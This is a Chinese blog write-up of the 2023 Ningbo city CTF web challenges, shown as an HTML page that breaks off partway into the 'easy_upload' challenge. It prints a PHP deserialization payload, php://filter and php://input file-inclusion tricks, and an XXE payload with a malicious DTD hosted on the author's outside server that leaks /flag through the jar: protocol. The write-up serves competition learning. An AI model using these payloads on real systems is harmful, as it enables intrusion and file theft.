@@ -1,0 +1,987 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="dr0n">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="webQuerysqlmap一把梭  Deserialization源码 1234567891011121314151617&#x2F;&#x2F;The location of the flag is at route.php$read &#x3D; $_POST[&quot;read&quot;];$input &#x3D; $_POST[&quot;input&quot;];if(!isset($read) or !isset($">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023宁波市赛wp">
+<meta property="og:url" content="https://www.dr0n.top/posts/2d3983d/index.html">
+<meta property="og:site_name" content="Dr0n&#39;s blog">
+<meta property="og:description" content="webQuerysqlmap一把梭  Deserialization源码 1234567891011121314151617&#x2F;&#x2F;The location of the flag is at route.php$read &#x3D; $_POST[&quot;read&quot;];$input &#x3D; $_POST[&quot;input&quot;];if(!isset($read) or !isset($">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/Query.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/CodeCheck.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/SimpleDocument.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/BeautifulImage.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-4.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-5.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-6.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-7.png">
+<meta property="article:published_time" content="2023-05-20T06:00:00.000Z">
+<meta property="article:modified_time" content="2024-02-29T08:47:27.927Z">
+<meta property="article:author" content="dr0n">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="2023">
+<meta property="article:tag" content="宁波">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/Query.png">
+  
+  
+  
+  <title>2023宁波市赛wp - Dr0n&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"150aacf9a16405ad4ea9ead54ecac598","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Dr0n&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                时间轴
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/fluid-bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023宁波市赛wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        dr0n
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-05-20 14:00" pubdate>
+          2023年5月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          136 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2023宁波市赛wp</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h2><p>sqlmap一把梭</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/Query.png"></p>
+<h2 id="Deserialization"><a href="#Deserialization" class="headerlink" title="Deserialization"></a>Deserialization</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//The location of the flag is at route.php</span><br><span class="hljs-variable">$read</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;read&quot;</span>];<br><span class="hljs-variable">$input</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;input&quot;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$read</span>) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$read</span>, <span class="hljs-string">&quot;f14g&quot;</span>)===<span class="hljs-literal">FALSE</span>)<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$read</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-variable">$input2</span> = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$input</span>;<br>    <span class="hljs-variable">$input2</span>-&gt;position = <span class="hljs-string">&quot;route.php&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>php://filter</code>读<code>route.php</code></p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;h1&gt;Here can you find the position of the flag!&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$position</span> = <span class="hljs-string">&quot;f14g.php&quot;</span>;<br><span class="hljs-variable">$gadget</span> = <span class="hljs-string">&quot;h1nt.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>再读<code>h1nt.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;position);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;position;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>反序列化，调用<code>__clone</code>方法时读<code>f14g.php</code><br>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>=<span class="hljs-string">&#x27;f14g.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//read=h1nt.php&amp;input=O:4:&quot;test&quot;:1:&#123;s:8:&quot;position&quot;;s:8:&quot;f14g.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;***********&quot;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])!== <span class="hljs-string">&quot;flag&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])!==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>php://input</code>使得a的值为<code>flag</code>，b同理，d使用<code>php://filter</code>读文件</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/CodeCheck.png"></p>
+<h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>访问靶机自动跳转到<code>/parser?body=%7B&quot;1&quot;%3A&quot;2&quot;%7D</code>，并返回<code>json</code><br>访问<code>/parser?body=1</code>，返回<code>plain</code></p>
+<p>猜测这是一个类型解析器，可以解析输入的数据类型并返回</p>
+<p>fuzz后发现支持xml格式，尝试利用xxe漏洞。因为是java环境，尝试使用<code>jar协议</code>，<a target="_blank" rel="noopener" href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html#jar-x2F-x2F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">原理参考</a></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-1.png"></p>
+<p>vps上用flask构建一个恶意dtd</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;!ENTITY % c SYSTEM <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;<br>&lt;!ENTITY % a <span class="hljs-string">&quot;&lt;!ENTITY remote SYSTEM &#x27;jar:http://20.2.129.79/1.zip!/%c;&#x27;&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>在apache上放一个1.zip，内容随意</p>
+<p>当<code>jar协议</code>在<code>1.zip</code>中找不到<code>file://</code>中指定的文件时就会报错，通过报错回显文件内容</p>
+<p>且过滤了<code>&quot;http</code>，可以使用<code>&quot;url:http</code>来绕过</p>
+<p>最终payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;url:http://20.2.129.79:7777/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %b;</span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-2.png"></p>
+<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>打开靶机后有一个文件上传功能</p>
+<p>但是对路径，后缀，文件内容进行了检测</p>
+<p>路径中过滤了<code>..</code>，不能进行目录穿越，只能存放在<code>/tmp/</code>下，·且后缀检查的黑名单较严格</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_path</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = [<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&#x27;\.\.&#x27;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$black_list</span>) . <span class="hljs-string">&#x27;)/i&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$path</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_extension</span>(<span class="hljs-params"><span class="hljs-variable">$extension</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;phtml&#x27;</span>, <span class="hljs-string">&#x27;py&#x27;</span>, <span class="hljs-string">&#x27;pl&#x27;</span>,<span class="hljs-string">&#x27;pyc&#x27;</span>,<span class="hljs-string">&#x27;php7&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;ini&#x27;</span>,<span class="hljs-string">&#x27;htaccess&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$extension</span>),<span class="hljs-variable">$black_list</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">up_base64</span>(<span class="hljs-params"><span class="hljs-variable">$file_path</span>, <span class="hljs-variable">$base64</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(data:\s*image\/(\w*);base64,)/&#x27;</span>, <span class="hljs-variable">$base64</span>, <span class="hljs-variable">$result</span>)) &#123;<br><br>        <span class="hljs-variable">$type</span> = <span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_extension</span>(<span class="hljs-variable">$type</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">time</span>() . <span class="hljs-string">&quot;/&quot;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$res</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$res</span>, <span class="hljs-number">0777</span>);<br>        &#125;<br>        <span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;    <span class="hljs-comment">//图片名以时间命名</span><br>        <span class="hljs-comment">//保存为文件</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$newFile</span>, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$base64</span>)))) &#123;<br>            <span class="hljs-comment">//返回这个图片的路径</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$newFile</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;base64&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_path</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">up_base64</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>], <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;upload success&lt;/h1&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Hacker!&lt;/h1&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>同时扫描网址发现存在<code>/app</code>路由</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-1.png"></p>
